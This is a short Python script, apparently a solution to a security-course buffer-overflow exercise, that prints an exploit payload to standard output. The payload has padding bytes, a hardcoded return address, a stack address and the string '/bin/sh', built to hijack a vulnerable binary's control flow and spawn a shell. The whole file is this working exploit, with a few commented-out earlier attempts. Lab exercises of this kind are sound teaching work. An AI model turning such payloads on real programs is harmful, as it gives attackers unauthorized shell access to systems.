#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
shell_len = len("/bin/sh")
padding_len = (22)
output=(b"\x32"*padding_len)+b"\xb3\x88\x04\x08"+(b"\x74\xb3\xfe\xff")+(b"\x2f\x62\x69\x6e\x2f\x73\x68\x00") 
sys.stdout.buffer.write(output)
#sys.stdout.buffer.write(pack("<I", -1))
#sys.stdout.buffer.write(pack("<I", 25))
#sys.stdout.buffer.write(pack("<I", 32))

